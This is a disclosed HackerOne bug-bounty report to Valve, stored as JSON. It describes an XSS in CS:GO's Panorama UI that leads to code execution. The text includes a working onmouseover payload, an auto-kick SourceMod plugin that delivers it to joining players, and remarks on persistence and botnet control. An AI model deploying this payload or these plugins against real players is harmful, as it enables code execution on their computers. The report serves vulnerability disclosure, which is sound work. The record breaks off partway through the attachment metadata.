@@ -1,0 +1,593 @@
+{
+  "id": 631956,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzE5NTY=",
+  "url": "https://hackerone.com/reports/631956",
+  "title": "Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-29T07:04:48.145Z",
+  "submitted_at": "2019-06-29T07:04:48.145Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "shayhelman",
+    "url": "/shayhelman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23363,
+    "url": "https://hackerone.com/valve",
+    "handle": "valve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Valve",
+      "twitter_handle": "",
+      "website": "https://www.valvesoftware.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-08T22:10:26.401Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-09-04T23:27:09.659Z",
+  "team_member_agreed_on_going_public_at": "2019-10-08T22:10:26.289Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Overview\nCounter-Strike: Global Offensive's UI is built of a framework called [Panorama](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama) which is heavily influenced by modern HTML/CSS with JS capabilities. Because of these properties, the UI becomes easily vulnerable to different types of code injection, most notably XSS.\n\nPreviously, it was discovered that a certain message-type sent through the lobby chat allowed anyone to send raw HTML strings that would then be parsed by the Panorama framework as valid HTML. The reason this XSS was possible was because of a certain Panorama tag that was left enabled.\n\nIn order to see how these Panorama files are constructed, you must extract them from the CS:GO files. By unzipping the file under `steamapps\\common\\Counter-Strike Global Offensive\\csgo\\panorama\\code.pbin`, a plethora of UI files are revealed. In these files we can see how this lobby XSS was possible by looking in the file named `panorama\\layout\\chat.xml` on line `18` we can see \n```\n<Label html=\"true\" text=\"&lt;span class='chat-entry__name'&gt;{s:player_name}&lt;/span&gt; {s:msg}\" acceptsinput=\"true\" />\n```\n\nBy having `html=\"true\"` in a Panorama tag, any input is parsed as raw HTML. This is what lead to the discovery of this exploit. We grepped through all the Panorama layout files looking for any that contained `html=\"true\"` and within a few seconds we found a particular file with the name `panorama\\layout\\popups\\popup_generic.xml`. We knew that the disconnect message was utilizing this exact file which is when we started to test.\n\nOur first payload was testing if an image could load via a custom disconnect message. So we tried a simple payload `disconnect \"<img src='https://i.imgur.com/IbJKM0M.jpg'>\"`, and after running it twice (for caching purposes), the cat appeared to our surprise. {F518974}\n\nNow that we knew disconnect popups were exploitable, we tried to see if this could be done remotely through the kick function. We tested first on local servers with the `kickid` command but had no luck. We then setup a dedicated server with SourceMod and attemped to kick with `sm_kick`. This worked at first but it had a character limit which did not allow much room for meaningful payloads. After reading through SourceMod documentation, we found a function called ` KickClient()` which did not have a character limit. After testing with some common payloads, we concluded that `<a onmouseover='javascript:CODE'></a>` is the best method with the least amount of user interaction to trigger code execution since the Panorama HTML parser is very limited in the amount of working tags and event listeners which is highlighted [here](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama#.JS_.28Javascript.29).\n\n## Steps to reproduce\n\n* Setup a [dedicated CS:GO server](https://developer.valvesoftware.com/wiki/Counter-Strike:_Global_Offensive_Dedicated_Servers)\n* Install [SourceMod](https://wiki.alliedmods.net/Installing_sourcemod) and [Metamod](https://www.sourcemm.net/)\n* Download the attached SourceMod plugin and place it under `\\addons\\sourcemod\\plugins\\`: F518946\n* Start up CS:GO and connect to the server\n* Run this string in your client's console:\n```\nsm_testkick <a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">The remote host stopped receiving communications and closed the connection</a>\n```\n\n* Mouse over the text `The remote host stopped receiving communications and closed the connection.`\n\n## PoC\n\n{F518945}\nTriggered with the command:\n```\nsm_testkick <a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">The remote host stopped receiving communications and closed the connection</a>\n```\n\n### SourceMod Kick Plugin Source F518946\n\n```cpp\n#include <sourcemod>\n\n#pragma semicolon 1\n#pragma newdecls required\n\npublic void OnPluginStart()\n{\n    RegConsoleCmd(\"sm_testkick\", Cmd_Kick);\n}\n\npublic Action Cmd_Kick(int client, int args)\n{\n    if (args <= 0) {\n        PrintToChat(client, \"No arguments provided - Usage: !testkick <Kick Message>\");\n        return Plugin_Handled;\n    }\n\n    char full[5120];\n    GetCmdArgString(full, sizeof(full));\n\n    for (int i = 0; i < 5; i++) {\n        KickClient(client, full);\n    }\n\n    return Plugin_Handled;\n}\n```\n\n## Impact\n\nAn attacker could achieve full system access to the victims computer. A dummy server can be setup with an autokick message containing the payload. The victim would just need to join the attackers server and they would become infected. Moreover, an attacker could trick a server owner into installing a malicious SourceMod plugin that would be able to deliver the malicious payload to anyone on the server.\n\nSimilar to #470520, the exploit can be triggered via browser by connecting the victim to an attacker controlled server.\n\nThis exploit could also be combined with any Panorama function present [here](https://developer.valvesoftware.com/wiki/CSGO_Panorama_API) in order to further mess with the game's functionality (such as starting and accepting a new match or displaying a custom popup message). The attacker virtually has full control over all UI features.\n\nEven though the payload is only triggered via the `mouseover` event, because the way the message appears in the center of the victim's screen and the ability to fill the center of the screen with exploitable text, user interaction is negligible.\n\nIt is also possible to persist the Javascript code execution by hoisting a function to the scheduler. Eg. `$.Schedule(1, function)`. Furthermore, it is possible to set up a persistent remote connection to the victim's game instance by utilizing `eval()` and `$.AsyncWebRequest()` which would allow the attacker to manage multiple victims in some sort of botnet.\n\nYours respectfully,\nShay @shayhelman and Felix @dukebruno123",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 518945,
+      "file_name": "cIvlT8vHqy.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/518/945/765f0cd0b504bf1afce6a5b6a239e20ed8823130/cIvlT8vHqy.gif?response-content-disposition=attachment%3B%20filename%3D%22cIvlT8vHqy.gif%22%3B%20filename%2A%3DUTF-8%27%27cIvlT8vHqy.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3C7WDVGJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIDn3me4BiYTd9cEhiJgERTjoUKuLBgplckyo1gv%2Bebm1AiEAoY8YKDOvzgyQ3egDWlUq%2Bg%2BoNFbGN1HoNJcuLub14nsqsQUIKBADGgwwMTM2MTkyNzQ4NDkiDEqDO33z8UmFn3D1piqOBXBmutxLn4O8upRMZQVOHUfAZz%2F5H956nuLFNB1w4dHM76Efd6Esqgkx2W3whuKEdFaGEO2k4o2AP0w7OpJczkeT3IDGGn4RUI5bPh%2BiJMkqVI8tK3UzEpJJUSF6HbMTrwao7Uati6%2BREOOmMX2yjZ83ZIRyEqtTJSLCS4BGXULPEFPojDY4qjNA5b60yyjAnPj6gbXk%2BZoo550WZHFsUcA0FJSu69aScHPCXoxh2hDEQf8HLfH4FrgkK4qMpYKxTdxDKK46CLw%2Fg8T4YuK2rOrqRiOsGsGglYhAi9L5PX6QU8fFeU49TJFGG%2BkWWZX7ZXAb53PZjbJmvmXB%2FTEgBADExPBqb0GtBwSXjsfeg2MUkJ1JJKrjSnftn2uF44Lwl3eXcyZ%2FLbiRYRl8qOKyOuIMKOV4yidbKYdgPdbf35OZMs6zr%2F%2FRxFnwc%2FHV68T%2BizwT%2BFlshKH3y%2B%2BbJFOP6i0T1v7M7nKQFvxNABDtplEI%2B9fqUGW1Dg7ibbsBkVWXePr29ZQd73EmOTWK8CQDFOrZf9Oy4UK9y%2FKH%2Bc21lt7H7ZwU%2Fa2h97u0mRoHMoHc1rVbSje1tINDMsdaGwQRGz3ysdTjmviAJnhwBli9m9wXmWXllBnkXU4%2BfQtLWMu4iVOFewLKkpWUKsLuXh6jx3JosBPmfDd1N42E7Fr4XdEKa0y47oWruRIqlmjxP4X6JXrTROYLdF2CZ0zhGeAUylgD%2B4xxKokPK%2FGkiiw5BiLcaWolpFCXanJqcdWdwy6yMeRcmWXvrr50l3xmx4ZVenDU%2FJtgoI%2BVznl1w5kWpZyrrryWGATyEfw47VeINLtjJXQiBm%2FtsdJKR%2FUNyu1wxs4SPRLdf%2Fje9wnFOdNjAzD4n7qoBjqxAclBXSZX5G1EGG0VOqTUzC21u2MNyu51phI1ys1%2B6uIP3wgenMeIXpBmciTImpA3aFP4ng9cLZGSnZTRsU0zXZxH4%2FyvKBheT7YuS%2F6dlvGllnxjsRJpJSxFtvt%2BwQMln5HVRmPnEIWXGkSOdOWIYAiRkfYoHWEIfPVniUKAcjpGHmd44L06V2hWu2jHKJz33sdHWQxZVh5RDQ0uL0bYoUosxbzl%2BjgtMDeHkZmRLFwM3Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f328fb90dd68795274996a7bac3c19929a79ff282490dafc2bd7b1a5a43e5c80",
+      "file_size": 24568279,
+      "type": "image/gif",
+      "moderated": null
+    },
+    {
+      "id": 518946,
+      "file_name": "testkick.smx",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/518/946/e2ec09ffe25d51abb5e68d537fcdf388f17ee0fd/testkick.smx?response-content-disposition=attachment%3B%20filename%3D%22testkick.smx%22%3B%20filename%2A%3DUTF-8%27%27testkick.smx&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3C7WDVGJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIDn3me4BiYTd9cEhiJgERTjoUKuLBgplckyo1gv%2Bebm1AiEAoY8YKDOvzgyQ3egDWlUq%2Bg%2BoNFbGN1HoNJcuLub14nsqsQUIKBADGgwwMTM2MTkyNzQ4NDkiDEqDO33z8UmFn3D1piqOBXBmutxLn4O8upRMZQVOHUfAZz%2F5H956nuLFNB1w4dHM76Efd6Esqgkx2W3whuKEdFaGEO2k4o2AP0w7OpJczkeT3IDGGn4RUI5bPh%2BiJMkqVI8tK3UzEpJJUSF6HbMTrwao7Uati6%2BREOOmMX2yjZ83ZIRyEqtTJSLCS4BGXULPEFPojDY4qjNA5b60yyjAnPj6gbXk%2BZoo550WZHFsUcA0FJSu69aScHPCXoxh2hDEQf8HLfH4FrgkK4qMpYKxTdxDKK46CLw%2Fg8T4YuK2rOrqRiOsGsGglYhAi9L5PX6QU8fFeU49TJFGG%2BkWWZX7ZXAb53PZjbJmvmXB%2FTEgBADExPBqb0GtBwSXjsfeg2MUkJ1JJKrjSnftn2uF44Lwl3eXcyZ%2FLbiRYRl8qOKyOuIMKOV4yidbKYdgPdbf35OZMs6zr%2F%2FRxFnwc%2FHV68T%2BizwT%2BFlshKH3y%2B%2BbJFOP6i0T1v7M7nKQFvxNABDtplEI%2B9fqUGW1Dg7ibbsBkVWXePr29ZQd73EmOTWK8CQDFOrZf9Oy4UK9y%2FKH%2Bc21lt7H7ZwU%2Fa2h97u0mRoHMoHc1rVbSje1tINDMsdaGwQRGz3ysdTjmviAJnhwBli9m9wXmWXllBnkXU4%2BfQtLWMu4iVOFewLKkpWUKsLuXh6jx3JosBPmfDd1N42E7Fr4XdEKa0y47oWruRIqlmjxP4X6JXrTROYLdF2CZ0zhGeAUylgD%2B4xxKokPK%2FGkiiw5BiLcaWolpFCXanJqcdWdwy6yMeRcmWXvrr50l3xmx4ZVenDU%2FJtgoI%2BVznl1w5kWpZyrrryWGATyEfw47VeINLtjJXQiBm%2FtsdJKR%2FUNyu1wxs4SPRLdf%2Fje9wnFOdNjAzD4n7qoBjqxAclBXSZX5G1EGG0VOqTUzC21u2MNyu51phI1ys1%2B6uIP3wgenMeIXpBmciTImpA3aFP4ng9cLZGSnZTRsU0zXZxH4%2FyvKBheT7YuS%2F6dlvGllnxjsRJpJSxFtvt%2BwQMln5HVRmPnEIWXGkSOdOWIYAiRkfYoHWEIfPVniUKAcjpGHmd44L06V2hWu2jHKJz33sdHWQxZVh5RDQ0uL0bYoUosxbzl%2BjgtMDeHkZmRLFwM3Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=22c96ae2db7fd9b0422fd6467620f515ab1e7a1a8471cef1faaa35ff7ba06b2a",
+      "file_size": 3819,
+      "type": "application/octet-stream",
+      "moderated": null
+    },
+    {
+      "id": 518974,
+      "file_name": "cat.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/518/974/741770e22b299fe8e1b7c61ef8b25f9a31c96e8d/cat.png?response-content-disposition=attachment%3B%20filename%3D%22cat.png%22%3B%20filename%2A%3DUTF-8%27%27cat.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3C7WDVGJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIDn3me4BiYTd9cEhiJgERTjoUKuLBgplckyo1gv%2Bebm1AiEAoY8YKDOvzgyQ3egDWlUq%2Bg%2BoNFbGN1HoNJcuLub14nsqsQUIKBADGgwwMTM2MTkyNzQ4NDkiDEqDO33z8UmFn3D1piqOBXBmutxLn4O8upRMZQVOHUfAZz%2F5H956nuLFNB1w4dHM76Efd6Esqgkx2W3whuKEdFaGEO2k4o2AP0w7OpJczkeT3IDGGn4RUI5bPh%2BiJMkqVI8tK3UzEpJJUSF6HbMTrwao7Uati6%2BREOOmMX2yjZ83ZIRyEqtTJSLCS4BGXULPEFPojDY4qjNA5b60yyjAnPj6gbXk%2BZoo550WZHFsUcA0FJSu69aScHPCXoxh2hDEQf8HLfH4FrgkK4qMpYKxTdxDKK46CLw%2Fg8T4YuK2rOrqRiOsGsGglYhAi9L5PX6QU8fFeU49TJFGG%2BkWWZX7ZXAb53PZjbJmvmXB%2FTEgBADExPBqb0GtBwSXjsfeg2MUkJ1JJKrjSnftn2uF44Lwl3eXcyZ%2FLbiRYRl8qOKyOuIMKOV4yidbKYdgPdbf35OZMs6zr%2F%2FRxFnwc%2FHV68T%2BizwT%2BFlshKH3y%2B%2BbJFOP6i0T1v7M7nKQFvxNABDtplEI%2B9fqUGW1Dg7ibbsBkVWXePr29ZQd73EmOTWK8CQDFOrZf9Oy4UK9y%2FKH%2Bc21lt7H7ZwU%2Fa2h97u0mRoHMoHc1rVbSje1tINDMsdaGwQRGz3ysdTjmviAJnhwBli9m9wXmWXllBnkXU4%2BfQtLWMu4iVOFewLKkpWUKsLuXh6jx3JosBPmfDd1N42E7Fr4XdEKa0y47oWruRIqlmjxP4X6JXrTROYLdF2CZ0zhGeAUylgD%2B4xxKokPK%2FGkiiw5BiLcaWolpFCXanJqcdWdwy6yMeRcmWXvrr50l3xmx4ZVenDU%2FJtgoI%2BVznl1w5kWpZyrrryWGATyEfw47VeINLtjJXQiBm%2FtsdJKR%2FUNyu1wxs4SPRLdf%2Fje9wnFOdNjAzD4n7qoBjqxAclBXSZX5G1EGG0VOqTUzC21u2MNyu51phI1ys1%2B6uIP3wgenMeIXpBmciTImpA3aFP4ng9cLZGSnZTRsU0zXZxH4%2FyvKBheT7YuS%2F6dlvGllnxjsRJpJSxFtvt%2BwQMln5HVRmPnEIWXGkSOdOWIYAiRkfYoHWEIfPVniUKAcjpGHmd44L06V2hWu2jHKJz33sdHWQxZVh5RDQ0uL0bYoUosxbzl%2BjgtMDeHkZmRLFwM3Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6cd2f58475619759b0c01889105c501700eaa56c49ec4470ca37f841819df58a",
+      "file_size": 2207899,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 407,
+  "voters": [
+    "jbreed",
+    "nekz",
+    "hexpwn",
+    "env",
+    "nohats",
+    "act1on3",
+    "akr3ch",
+    "njbooher",
+    "arif_y",
+    "primeministerofcats",
+    "and 397 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 1286,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "csgo.exe",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 5230483,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @shayhelman,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@orangeband ",
+      "automated_response": false,
+      "created_at": "2019-07-01T16:41:30.947Z",
+      "updated_at": "2019-07-01T16:41:30.947Z",
+      "actor": {
+        "username": "orangeband",
+        "cleared": false,
+        "verified": false,
+        "url": "/orangeband",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/390/540/b55c564a8a6f8099d28ea9afa41d197ad0031fc3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5241374,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "@shayhelman \n\nWhen you say:\n\n>Run this string in your client's console:\n\n>`sm_testkick <a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">The remote host stopped receiving communications and closed the connection</a>`\n\nDo you mean that, as a victim, we need to execute that string in the client's console?\n\nAt some point you also mentioned that it should be possible to configure an `auto kick` that would trigger the issue, so I'm just trying to understand the attack flow and the level of user interaction required to exploit the issue.\n",
+      "automated_response": false,
+      "created_at": "2019-07-02T20:51:58.662Z",
+      "updated_at": "2019-07-02T20:51:58.662Z",
+      "actor": {
+        "username": "h1_analyst_everton",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_everton",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/997/bf60ed9bb749786ae3f68f25703bf0528699cda7_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5243431,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi @glassofbeer,\nSorry if this was not clear in the report. The `sm_testkick` F518946 command is meant to replicate what it would be like if the server initiated a `KickClient` on a user which in this case is yourself. As a victim, you would require no interaction in order to bring up the message `The remote host stopped receiving communications and closed the connection.` highlighted here {F518945}. After the kick message initiated by the server is sent to the victim/client, the user must have their mouse over the kick message which in this case is `The remote host stopped receiving communications and closed the connection.`. The reason I state that the mouse-over user interaction is neglible meaning that there is basically no user interaction, is because once a client is kicked and they are tabbed-in, their mouse defaults to the center position of the screen, forcing the payload to trigger.\n\nIf you have any more questions, please tell me.\n\nThank you,\n@shayhelman ",
+      "automated_response": false,
+      "created_at": "2019-07-03T07:17:43.986Z",
+      "updated_at": "2019-07-03T07:17:43.986Z",
+      "actor": {
+        "username": "shayhelman",
+        "cleared": false,
+        "verified": false,
+        "url": "/shayhelman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5247809,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Regarding your comment on the auto-kick that an attacker would set up, we have made a plugin that will do just that. F521670\nAgain place the file in the SourceMod plugins folder and restart the server.\n\nThe plugin waits for the victim to choose a team and spawns in-game, then initiates a kick. This is done in order to ensure that the victim's mouse is already hovering over our payload, making this exploit require no user interaction to trigger.\n```cpp\n#include <sourcemod>\n\n#pragma semicolon 1\n#pragma newdecls required\n\n// Create hook event for when a player spawns\npublic void OnPluginStart()\n{\n    HookEvent(\"player_spawned\", Event_PlayerSpawned);\n}\n\n// When the event gets fired create a 0.1 second timer\npublic Action Event_PlayerSpawned(Event event, const char[] name, bool dontBroadcast)\n{\n    int userid = event.GetInt(\"userid\");\n    CreateTimer(0.1, DoKick, userid);\n    return Plugin_Continue;\n}\n\n// Do the actual kick once the timer is over\npublic Action DoKick(Handle timer, int userid)\n{\n    // We have to validate the client before doing anything else we might crash\n    int client = GetClientOfUserId(userid);\n    if (client <= 0 || client > MAXPLAYERS || IsFakeClient(client)) {\n        return Plugin_Continue;\n    }\n\n    // Kick with malicious message\n    KickClient(client, \"<a onmouseover=\\\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\\\">-------------------------\\nBANNED\\n-------------------------\\n\\nYour account has been banned from this community.\\n\\nThe ban is non negotiable</a>\");\n    return Plugin_Continue;\n}\n```\nHere is a video of the autokick in action:\n{F521677}",
+      "automated_response": false,
+      "created_at": "2019-07-03T20:14:39.133Z",
+      "updated_at": "2019-07-03T20:14:39.133Z",
+      "actor": {
+        "username": "shayhelman",
+        "cleared": false,
+        "verified": false,
+        "url": "/shayhelman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 521677,
+          "filename": "autokick.gif",
+          "type": "image/gif",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/521/677/157554be2e18cae7019f99e6174a86e5fd84bc5e/autokick.gif?response-content-disposition=attachment%3B%20filename%3D%22autokick.gif%22%3B%20filename%2A%3DUTF-8%27%27autokick.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3C7WDVGJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIDn3me4BiYTd9cEhiJgERTjoUKuLBgplckyo1gv%2Bebm1AiEAoY8YKDOvzgyQ3egDWlUq%2Bg%2BoNFbGN1HoNJcuLub14nsqsQUIKBADGgwwMTM2MTkyNzQ4NDkiDEqDO33z8UmFn3D1piqOBXBmutxLn4O8upRMZQVOHUfAZz%2F5H956nuLFNB1w4dHM76Efd6Esqgkx2W3whuKEdFaGEO2k4o2AP0w7OpJczkeT3IDGGn4RUI5bPh%2BiJMkqVI8tK3UzEpJJUSF6HbMTrwao7Uati6%2BREOOmMX2yjZ83ZIRyEqtTJSLCS4BGXULPEFPojDY4qjNA5b60yyjAnPj6gbXk%2BZoo550WZHFsUcA0FJSu69aScHPCXoxh2hDEQf8HLfH4FrgkK4qMpYKxTdxDKK46CLw%2Fg8T4YuK2rOrqRiOsGsGglYhAi9L5PX6QU8fFeU49TJFGG%2BkWWZX7ZXAb53PZjbJmvmXB%2FTEgBADExPBqb0GtBwSXjsfeg2MUkJ1JJKrjSnftn2uF44Lwl3eXcyZ%2FLbiRYRl8qOKyOuIMKOV4yidbKYdgPdbf35OZMs6zr%2F%2FRxFnwc%2FHV68T%2BizwT%2BFlshKH3y%2B%2BbJFOP6i0T1v7M7nKQFvxNABDtplEI%2B9fqUGW1Dg7ibbsBkVWXePr29ZQd73EmOTWK8CQDFOrZf9Oy4UK9y%2FKH%2Bc21lt7H7ZwU%2Fa2h97u0mRoHMoHc1rVbSje1tINDMsdaGwQRGz3ysdTjmviAJnhwBli9m9wXmWXllBnkXU4%2BfQtLWMu4iVOFewLKkpWUKsLuXh6jx3JosBPmfDd1N42E7Fr4XdEKa0y47oWruRIqlmjxP4X6JXrTROYLdF2CZ0zhGeAUylgD%2B4xxKokPK%2FGkiiw5BiLcaWolpFCXanJqcdWdwy6yMeRcmWXvrr50l3xmx4ZVenDU%2FJtgoI%2BVznl1w5kWpZyrrryWGATyEfw47VeINLtjJXQiBm%2FtsdJKR%2FUNyu1wxs4SPRLdf%2Fje9wnFOdNjAzD4n7qoBjqxAclBXSZX5G1EGG0VOqTUzC21u2MNyu51phI1ys1%2B6uIP3wgenMeIXpBmciTImpA3aFP4ng9cLZGSnZTRsU0zXZxH4%2FyvKBheT7YuS%2F6dlvGllnxjsRJpJSxFtvt%2BwQMln5HVRmPnEIWXGkSOdOWIYAiRkfYoHWEIfPVniUKAcjpGHmd44L06V2hWu2jHKJz33sdHWQxZVh5RDQ0uL0bYoUosxbzl%2BjgtMDeHkZmRLFwM3Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=00554abc670a437d9cd427b89a48fffdc32ad949a4cc97f609df00bf4f5468b7"
+        },
+        {
+          "id": 521670,
+          "filename": "autokick.smx",
+          "type": "application/octet-stream",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/521/670/70af6db64f18e6ce57d2972f42d23425ccd650b2/autokick.smx?response-content-disposition=attachment%3B%20filename%3D%22autokick.smx%22%3B%20filename%2A%3DUTF-8%27%27autokick.smx&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3C7WDVGJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIDn3me4BiYTd9cEhiJgERTjoUKuLBgplckyo1gv%2Bebm1AiEAoY8YKDOvzgyQ3egDWlUq%2Bg%2BoNFbGN1HoNJcuLub14nsqsQUIKBADGgwwMTM2MTkyNzQ4NDkiDEqDO33z8UmFn3D1piqOBXBmutxLn4O8upRMZQVOHUfAZz%2F5H956nuLFNB1w4dHM76Efd6Esqgkx2W3whuKEdFaGEO2k4o2AP0w7OpJczkeT3IDGGn4RUI5bPh%2BiJMkqVI8tK3UzEpJJUSF6HbMTrwao7Uati6%2BREOOmMX2yjZ83ZIRyEqtTJSLCS4BGXULPEFPojDY4qjNA5b60yyjAnPj6gbXk%2BZoo550WZHFsUcA0FJSu69aScHPCXoxh2hDEQf8HLfH4FrgkK4qMpYKxTdxDKK46CLw%2Fg8T4YuK2rOrqRiOsGsGglYhAi9L5PX6QU8fFeU49TJFGG%2BkWWZX7ZXAb53PZjbJmvmXB%2FTEgBADExPBqb0GtBwSXjsfeg2MUkJ1JJKrjSnftn2uF44Lwl3eXcyZ%2FLbiRYRl8qOKyOuIMKOV4yidbKYdgPdbf35OZMs6zr%2F%2FRxFnwc%2FHV68T%2BizwT%2BFlshKH3y%2B%2BbJFOP6i0T1v7M7nKQFvxNABDtplEI%2B9fqUGW1Dg7ibbsBkVWXePr29ZQd73EmOTWK8CQDFOrZf9Oy4UK9y%2FKH%2Bc21lt7H7ZwU%2Fa2h97u0mRoHMoHc1rVbSje1tINDMsdaGwQRGz3ysdTjmviAJnhwBli9m9wXmWXllBnkXU4%2BfQtLWMu4iVOFewLKkpWUKsLuXh6jx3JosBPmfDd1N42E7Fr4XdEKa0y47oWruRIqlmjxP4X6JXrTROYLdF2CZ0zhGeAUylgD%2B4xxKokPK%2FGkiiw5BiLcaWolpFCXan